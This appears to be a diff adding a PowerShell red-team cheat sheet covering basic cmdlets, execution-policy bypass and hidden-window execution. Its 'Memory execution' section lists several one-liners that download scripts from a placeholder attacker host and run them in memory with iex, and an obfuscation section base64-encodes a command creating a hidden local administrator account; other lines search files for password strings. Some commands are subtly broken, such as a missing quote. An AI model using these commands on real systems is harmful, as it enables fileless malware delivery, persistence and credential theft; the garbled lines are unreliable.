@@ -1,0 +1,117 @@
+##################
+#Powershell Intro#
+##################
+#64-bit powershell location
+C:\windows\system32\WindowsPowershell
+
+#32-bit powershell location
+C:\windws\SysWOW64\WindowsPowershell
+
+#Check powershell environment
+[Environment]::Is64BitProcess
+
+#Adjusting execution policy
+powershell.exe -ExecutionPolicy Bypass .\psScript.ps1
+powershell.exe -ExecutionPolicy Unrestricted .\psScript.ps1
+
+#Hide Powershell window during execution
+powershell.exe -Windowstyle Hidden .\script.ps1
+
+#Execute powershell
+powershell.exe -command [ps command]
+powershell.exe -command  "& {  [ps commands] }"
+
+#Execute base64 commands
+powershell.exe -EncodedCommand [Encoded Command]
+
+#Run with no powershell profile
+powershell.exe -NoProfile [ps script]
+
+#List powershell commands
+Get-Command
+Get-Command -Name *netsh*
+
+#List aliases of a cmdlet
+Get-Alias -Definition [cmdlet]
+
+#List running processes (ps)
+Get-Process
+Get-Process | Format-List *
+Get-Process | Sort-Object -Unique | Format-List Path, Id
+
+#List items (ls)
+Get-ChildItem
+
+#Return all information related to the current operating system
+Get-WmiObject -class win32_operatingsystem | select -Property *
+
+#Navigate registry
+cd HKLM:\
+
+#search system for files containing certain strings
+Select-String -Path [search directory] -Pattern [pattern with regex (eg pass*)]
+ls -r [directory] -File *.txt | % {sls -PATH $_ -Pattern pass* }
+
+#Display contents of file
+Get-Content [file]
+
+#List services
+Get-Service "[pattern]"
+
+#List imported modules
+Get-Module
+
+#List available modules to import
+Get-Module -ListAvailable
+
+#Import a modules
+Import-Module [module name/path]
+
+##################
+#Memory execution#
+##################
+#Net.Webclient DownloadString Method
+iex (New-Object Net.Webclient).DownloadString(http[colon]//attacker_url/script.ps1")
+
+#Net.Webclient DownloadFile Method
+iex (New-Object System.Net.Webclient).DownloadFile("http[colon]//attacker_url/script.ps1","C:\programdata\payload.exe")
+
+#Net.WebClient OpenRead Method
+#.NET [Net.HttpWebRequest] class
+iex ([System.Net.WebRequest]::Create("http[colon]//attacker/script.ps1")).GetResponse()
+
+#XML Executable
+#XML file should contain below then execute XML file
+<?xml version="1.0"?>
+<command>
+	<a>
+		<execute>Get-Process</execute>
+	</a>
+</command>
+
+iex ((New-Object System.Xml.XmlDocument).Load("http[colon]//attacker/file.xml")).command.a.execute
+
+#Word.Application COM Object
+#Excel.Application COM Object
+#InternetExplorer.Application COM Object
+#MsXml2.ServerXmlHttp Com Object
+$downloader = New-Object -ComObject Msxml2.XMLHTTP
+$downloader.open("GET", "http[colon]//attacker/script.ps1", $false)
+$downloader.send()
+iex $downloader.responseText
+
+#Certutil.exe with -ping argument
+
+#Storage execution
+Net.WebClient DownloadFile Method
+BITSAdmin.exe
+Certutil.exe with -urlcache argument
+
+#############
+#Obfuscation#
+#############
+#Base 64 Encoding
+$command = 'net user admin1 "password" /ADD; net localgroup administrators admin1 /add'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
